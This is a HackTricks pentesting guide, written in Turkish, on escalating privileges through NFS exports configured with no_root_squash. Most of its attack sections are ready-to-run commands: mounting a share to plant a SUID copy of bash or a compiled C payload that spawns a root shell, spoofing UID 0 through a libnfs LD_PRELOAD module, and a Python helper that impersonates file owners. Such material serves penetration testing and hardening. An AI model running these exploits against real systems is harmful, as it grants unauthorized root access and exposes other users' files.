# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing Temel Bilgileri

NFS AUTH_SYS/AUTH_UNIX ile sunucu, dosya izin denetimlerini her RPC isteğinde gönderilen `uid` ve `gid` değerlerine göre yapar. Kerberos gibi diğer security flavor'lar farklı kimlik bilgileri kullanır ve sunucu, izinleri denetlemeden önce sayısal kimlik bilgilerini eşleyebilir.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Her UID ve GID'yi varsayılan olarak Linux'ta `nobody` (65534) olan anonymous hesaba eşler. `no_all_squash`, root olmayan istekler için varsayılandır.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux'ta varsayılandır ve UID/GID 0 (root) içeren istekleri anonymous hesaba eşler; diğer UID ve GID'ler squash edilmez.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing'i devre dışı bırakır; böylece UID/GID 0 içeren istekler sunucuda root olarak değerlendirilebilir.<sup>[[4]](#references)</sup>

İzin verilen bir client, **`no_root_squash`** ile yapılandırılmış yazılabilir bir export'u **`/etc/exports`** içinde mount edebilirse, UID/GID 0 istekleriyle buraya sunucunun root kullanıcısı olarak yazabilir.<sup>[[4]](#references)</sup>

**NFS** hakkında daha fazla bilgi için:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash kullanılarak Option 1:
- İzin verilen bir client'ta yazılabilir bir export'u root olarak mount edin, **`/bin/bash`** dosyasını buraya kopyalayın, **SUID** bit'ini ayarlayın ve `nosuid` kullanmayan bir victim mount'ından çalıştırın.<sup>[[2]](#references)[[4]](#references)</sup>
- Yüklenen dosyanın owner'ının root olarak kalması için sunucunun **`no_root_squash`** kullanması gerekir. Root squash edilirse, başka bir hesap için SUID binary yalnızca client bu dosyayı o hesabın sayısal UID/GID'siyle meşru olarak oluşturabildiğinde veya sahibi olabildiğinde mümkün olur.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2, derlenmiş C code kullanarak:
- İzin verilen bir client üzerinden directory'yi mount edin, SUID permissions'ı abuse eden derlenmiş bir payload kopyalayın, **SUID** bit'ini ayarlayın ve victim üzerinden çalıştırın (bazı [C SUID payload'ları](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) için bkz.).
- Öncekiyle aynı kısıtlamalar
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Makinenizden victim makineye bir **tunnel oluşturabiliyorsanız, gerekli portları tunnel üzerinden geçirerek bu privilege escalation işleminden yararlanmak için Remote sürümünü hâlâ kullanabilirsiniz**.\
> Aşağıdaki yöntem, `/etc/exports` export işlemini victim'ın IP adresiyle sınırlandırdığında kullanışlıdır: remote client bunu mount edemez, ancak local teknik, izin verilen host üzerinde zaten mount edilmiş share üzerinden çalışabilir.<sup>[[2]](#references)</sup>\
> Bu unprivileged libnfs yöntemi için **`/etc/exports`** içindeki export, işlemin non-reserved bir source port kullanabilmesi amacıyla `insecure` flag'ini kullanmalıdır; varsayılan `secure`'dır, ancak reserved bir port'a bind edebilen bir işlem bu seçeneğe ihtiyaç duymaz.<sup>[[1]](#references)[[4]](#references)</sup>

### Temel Bilgiler

Bir NFSv3 AUTH_UNIX client, her çağrıda effective UID, GID ve grupları içerir; server da permission kontrolleri için bunları kullanır. Bu local teknik, [libnfs](https://github.com/sahlberg/libnfs) aracılığıyla RPC credentials bilgilerini sahteleyerek bu modeli abuse eder; preload module, NFS context içindeki UID/GID değerlerinin override edilmesini destekler.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Library'nin Derlenmesi

libnfs örneği target kernel için adjustments gerektirebilir; burada kullanılan walkthrough, preload module derlenmeden önce fallocate syscall'larının comment out edilmesi gerektiğini özellikle belirtir.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit'i Gerçekleştirme

Örnek, bir shell başlatan küçük bir C yardımcı programı oluşturur; ardından bunu share üzerine yerleştirir ve NFS context'inde UID 0 ile `ld_nfs.so` kullanarak SUID-root yapar.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Exploit'i paylaşım üzerine yerleştirin ve UID'yi taklit ederek izinlerini değiştirin**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root privileges elde etmek için exploit'i çalıştırın**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: Stealthy File Access için NFShell

root access elde edildikten sonra bu `nfsh.py` pattern'i, bir komutu çalıştırmadan önce effective UID'yi hedef dosyanın UID'si olarak ayarlar; böylece ownership'i recursive olarak değiştirmeden erişim sağlar.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Şu şekilde çalıştırın:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Daha az bilinen bir NFS privesc hikâyesi](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Sürüm 3 Protokol Belirtimi](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
